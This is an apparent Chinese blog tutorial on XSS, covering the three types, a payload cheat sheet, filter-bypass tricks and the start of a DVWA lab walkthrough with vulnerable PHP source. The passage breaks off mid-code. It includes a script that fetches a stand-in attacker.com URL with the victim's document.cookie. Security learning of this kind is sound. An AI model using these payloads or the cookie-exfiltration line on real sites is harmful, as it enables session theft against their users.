<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"zh1yu.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="xss属于top10漏洞之一，之前或多或少接触了解过，不过这次准备全面学习一手">
<meta property="og:type" content="article">
<meta property="og:title" content="dvwa&amp;pikachu之xss">
<meta property="og:url" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/index.html">
<meta property="og:site_name" content="知鱼的Blog">
<meta property="og:description" content="xss属于top10漏洞之一，之前或多或少接触了解过，不过这次准备全面学习一手">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/1.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/2.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/3.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/4.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/5.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/6.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/7.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/8.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/9.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/10.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/11.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/12.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/13.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/14.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/15.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/16.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/17.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/18.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/19.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/21.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/20.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/22.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/23.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/24.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/25.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/26.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/27.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/28.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/29.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/30.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/32.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/31.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/34.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/35.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/36.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/37.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/38.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/39.png">
<meta property="og:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/40.png">
<meta property="article:published_time" content="2025-07-01T07:20:42.000Z">
<meta property="article:modified_time" content="2025-07-04T07:53:30.161Z">
<meta property="article:author" content="zh1yu">
<meta property="article:tag" content="xss">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/1.png">

<link rel="canonical" href="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>dvwa&pikachu之xss | 知鱼的Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">知鱼的Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://zh1yu.xyz/2025/07/01/dvwa%E4%B9%8Bxss/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/zh1yu2.jpg">
      <meta itemprop="name" content="zh1yu">
      <meta itemprop="description" content="花有重开日,人无再少年">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="知鱼的Blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          dvwa&pikachu之xss
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-07-01 15:20:42" itemprop="dateCreated datePublished" datetime="2025-07-01T15:20:42+08:00">2025-07-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-07-04 15:53:30" itemprop="dateModified" datetime="2025-07-04T15:53:30+08:00">2025-07-04</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p> xss属于top10漏洞之一，之前或多或少接触了解过，不过这次准备全面学习一手</p>
<span id="more"></span>
<h1 id="xss介绍"><a href="#xss介绍" class="headerlink" title="xss介绍"></a>xss介绍</h1><p><strong>XSS（Cross-Site Scripting，跨站脚本攻击）</strong>（与css进行区别）  是一种常见的Web安全漏洞，攻击者通过在目标网站上注入恶意脚本（通常是JavaScript），使得这些脚本在其他用户的浏览器中执行。XSS攻击可以窃取用户数据（如Cookie、Session Token）、篡改网页内容、重定向用户到恶意网站，甚至进行更高级的攻击（如CSRF、键盘记录等）。</p>
<h3 id="xss存在的原因"><a href="#xss存在的原因" class="headerlink" title="xss存在的原因"></a>xss存在的原因</h3><p><strong>Web应用程序对用户输入数据的不充分过滤和验证</strong>，导致恶意脚本被注入到网页中并在其他用户的浏览器中执行。</p>
<h3 id="xss的分类"><a href="#xss的分类" class="headerlink" title="xss的分类"></a>xss的分类</h3><p>分为：<strong>存储型、反射型、DOM型</strong></p>
<h4 id="存储型XSS（Persistent-XSS）"><a href="#存储型XSS（Persistent-XSS）" class="headerlink" title="存储型XSS（Persistent XSS）"></a>存储型XSS（Persistent XSS）</h4><p>是一种恶意脚本被<strong>永久存储</strong>在目标服务器（如数据库、文件系统、评论区等）的XSS攻击方式。当其他用户访问受影响页面时，存储的恶意脚本会自动加载并执行，无需用户点击特殊链接。</p>
<p><strong>示例场景</strong></p>
<p><strong>（1）评论区XSS</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 攻击者提交的评论 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  <span class="title function_">fetch</span>(<span class="string">&#x27;https://attacker.com/steal?cookie=&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>该评论被存入数据库。其他用户访问该页面时，脚本自动执行，发送他们的Cookie到攻击者服务器</p>
<p><strong>（2）用户名XSS</strong></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 攻击者注册的用户名 --&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>用户名显示在所有页面（如论坛、用户列表）。</li>
<li>其他用户浏览时触发<code>onerror</code>，执行恶意代码。</li>
</ul>
<p><img src="1.png" alt="图片"></p>
<h4 id="反射型XSS（Reflected-Cross-Site-Scripting）"><a href="#反射型XSS（Reflected-Cross-Site-Scripting）" class="headerlink" title="反射型XSS（Reflected Cross-Site Scripting）"></a>反射型XSS（Reflected Cross-Site Scripting）</h4><p>是一种恶意脚本<strong>不会存储在服务器上</strong>，而是通过URL参数、表单提交等方式<strong>反射回浏览器</strong>并执行的XSS攻击方式。</p>
<p><strong>示例场景</strong></p>
<p><strong>（1）搜索框反射XSS</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">https</span>:<span class="comment">//example.com/search?query=&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>如果网站直接返回 <code>query</code> 参数到HTML页面：</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;您搜索的内容：&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)&lt;<span class="regexp">/script&gt;&lt;/</span>div&gt;</span><br></pre></td></tr></table></figure>
<p>访问该URL时，脚本被执行。</p>
<p><img src="2.png" alt="图片"></p>
<h4 id="DOM型XSS（Document-Object-Model-based-XSS）"><a href="#DOM型XSS（Document-Object-Model-based-XSS）" class="headerlink" title="DOM型XSS（Document Object Model-based XSS）"></a>DOM型XSS（Document Object Model-based XSS）</h4><p>是一种完全在<strong>客户端浏览器</strong>中发生的XSS攻击，恶意代码通过修改DOM环境执行，<strong>不经过服务器</strong>。与反射型/存储型XSS不同，DOM型XSS的漏洞存在于前端JavaScript代码中。</p>
<p>以下 JavaScript 操作可能触发 DOM XSS：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>危险操作</th>
<th>示例</th>
<th>风险</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>直接修改 <code>innerHTML</code></strong></td>
<td><code>element.innerHTML = userInput</code></td>
<td>插入的 HTML 会被解析</td>
</tr>
<tr>
<td><strong>动态执行脚本</strong></td>
<td><code>eval(userInput)</code></td>
<td>直接执行字符串代码</td>
</tr>
<tr>
<td><strong>未转义的 URL 处理</strong></td>
<td><code>location.href = userInput</code></td>
<td>可能触发 <code>javascript:</code> 伪协议</td>
</tr>
<tr>
<td><strong>不安全的 DOM API</strong></td>
<td><code>document.write(userInput)</code></td>
<td>直接写入原始 HTML</td>
</tr>
</tbody>
</table>
</div>
<p><strong>示例场景</strong></p>
<p><strong>（1）不安全的 <code>innerHTML</code> 操作</strong></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从URL获取参数并直接插入DOM</span></span><br><span class="line"><span class="keyword">const</span> payload = <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>));</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;content&quot;</span>).<span class="property">innerHTML</span> = payload;</span><br></pre></td></tr></table></figure>
<p>攻击者构造URL：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//example.com/#&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问后，<code>onerror</code> 触发XSS。</p>
<h3 id="三种xss区别："><a href="#三种xss区别：" class="headerlink" title="三种xss区别："></a>三种xss区别：</h3><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>数据来源</th>
<th>触发位置</th>
<th>是否依赖服务器</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>DOM 型</strong></td>
<td>URL/前端存储</td>
<td>纯前端处理</td>
<td>❌ 不依赖</td>
</tr>
<tr>
<td><strong>反射型</strong></td>
<td>URL 参数</td>
<td>服务器返回恶意脚本</td>
<td>✅ 依赖</td>
</tr>
<tr>
<td><strong>存储型</strong></td>
<td>数据库/存储</td>
<td>服务器返回恶意脚本</td>
<td>✅ 依赖</td>
</tr>
</tbody>
</table>
</div>
<h3 id="XSS的攻击载荷"><a href="#XSS的攻击载荷" class="headerlink" title="XSS的攻击载荷"></a>XSS的攻击载荷</h3><p><strong>以下所有标签的 &gt; 都可以用 // 代替,例如 &lt; script&gt; alert(1) &lt;/script//</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">标签：<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">标签是最直接的XSS有效载荷, 脚本标记可以引用外部的JavaScript代码,也可以将代码插入脚本标记中</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">	-----------------------------</span></span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="language-xml"><span class="language-handlebars">	 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span></span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   #弹出hello</span><br><span class="line">	 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/hello/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>   #弹出hello</span><br><span class="line">	 <span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>        #弹出1,对于数字可以不用引号</span><br><span class="line">	 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>      #document 是 浏览器提供的全局 JavaScript 对象,可以弹出cookie</span><br><span class="line">	 <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx.com/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  #引用外部的xss</span><br><span class="line">	------------------------------</span><br><span class="line"> <span class="tag">&lt;<span class="name">svg</span>&gt;</span>标签：</span><br><span class="line">	------------------------------</span><br><span class="line">	 <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>//		</span></span><br><span class="line"><span class="tag">	<span class="attr">------------------------------</span></span></span><br><span class="line"><span class="tag"> &lt;<span class="attr">img</span>&gt;</span>标签：</span><br><span class="line">	------------------------------</span><br><span class="line">	 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span>  #弹出cookie</span><br><span class="line">	------------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>标签：</span><br><span class="line">	------------------------------</span><br><span class="line">	 <span class="tag">&lt;<span class="name">body</span> <span class="attr">οnlοad</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">	 <span class="tag">&lt;<span class="name">body</span> <span class="attr">οnpageshοw</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">	------------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span>标签：</span><br><span class="line">	------------------------------</span><br><span class="line">	 <span class="tag">&lt;<span class="name">video</span> <span class="attr">οnlοadstart</span>=<span class="string">alert(1)</span> <span class="attr">src</span>=<span class="string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span></span><br><span class="line">	------------------------------</span><br><span class="line"><span class="tag">&lt;<span class="name">Style</span>&gt;</span><span class="language-xml">标签：</span></span><br><span class="line"><span class="language-xml">	------------------------------</span></span><br><span class="line"><span class="language-xml">	 <span class="tag">&lt;<span class="name">style</span> <span class="attr">οnlοad</span>=<span class="string">alert(1)</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	------------------------------</span><br></pre></td></tr></table></figure>
<h3 id="XSS漏洞的挖掘"><a href="#XSS漏洞的挖掘" class="headerlink" title="XSS漏洞的挖掘"></a>XSS漏洞的挖掘</h3><p>一般情况下，反射型XSS在搜索框啊，或者是页面跳转啊这些地方，而存储型XSS一般是留言，或者用户存储的地方，而DOM呢？是在DOM位置上，不取决于输入环境上。</p>
<h3 id="XSS的简单绕过滤和绕过"><a href="#XSS的简单绕过滤和绕过" class="headerlink" title="XSS的简单绕过滤和绕过"></a>XSS的简单绕过滤和绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.区分大小写过滤标签：</span><br><span class="line">	  过滤：$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">/&quot;,&quot;&quot;,$name);      //过滤<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">			$name=<span class="title function_">preg_replace</span>(<span class="string">&quot;/&lt;\/script&gt;/&quot;</span>,<span class="string">&quot;&quot;</span>,$name);   <span class="comment">//过滤</span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	  绕过：可以使用大小写绕过  <span class="tag">&lt;<span class="name">scripT</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)</span><span class="tag">&lt;/<span class="name">scripT</span>&gt;</span></span><br><span class="line">----------------------------------</span><br><span class="line"> 2.不区分大小写过滤标签：/i：不区分大小写</span><br><span class="line">	  过滤：$name=preg_replace(&quot;/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">/i&quot;,&quot;&quot;,$name);    //不区分大小写过滤 <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="language-handlebars">			$name=<span class="title function_">preg_replace</span>(<span class="string">&quot;/&lt;\/script&gt;/i&quot;</span>,<span class="string">&quot;&quot;</span>,$name);  <span class="comment">//不区分大小写过滤 </span></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">	  绕过：可以使用嵌套的script标签绕过：&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ipt&gt;<span class="title function_">alert</span>(<span class="string">&#x27;hack&#x27;</span>)&lt;/scr</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>ipt&gt;</span><br><span class="line">---------------------------------- </span><br><span class="line"> 3.不区分大小写,过滤之间的所有内容：</span><br><span class="line">	  过滤：$name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] ); //过滤了<span class="tag">&lt;<span class="name">script</span>  <span class="attr">及其之间的所有内容</span></span></span><br><span class="line"><span class="tag">	  <span class="attr">绕过</span>：<span class="attr">虽然无法使用</span>&lt;<span class="attr">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">标签注入XSS代码,但是可以通过img、body等标签的事件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			或者iframe等标签的 rc注入恶意的js代码。</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">			<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">οnerrοr</span>=<span class="string">alert(</span>&#x27;<span class="attr">hack</span>&#x27;)&gt;</span> </span></span></span><br></pre></td></tr></table></figure>
<h1 id="dvwa"><a href="#dvwa" class="headerlink" title="dvwa"></a>dvwa</h1><h2 id="Reflected型xss"><a href="#Reflected型xss" class="headerlink" title="Reflected型xss"></a>Reflected型xss</h2><h3 id="low："><a href="#low：" class="headerlink" title="low："></a>low：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;<span class="title function_">alert</span>(<span class="string">&quot;x&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="3.png" alt="图片"></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>未对输入内容过滤，导致反射xss</p>
<h3 id="medium："><a href="#medium：" class="headerlink" title="medium："></a>medium：</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;<span class="title class_">Script</span>&gt;<span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)&lt;/<span class="title class_">Script</span>&gt;</span><br></pre></td></tr></table></figure>
<p>这里可以用大小写，也可以用双写绕过；</p>
<p><img src="4.png" alt="图片"></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> 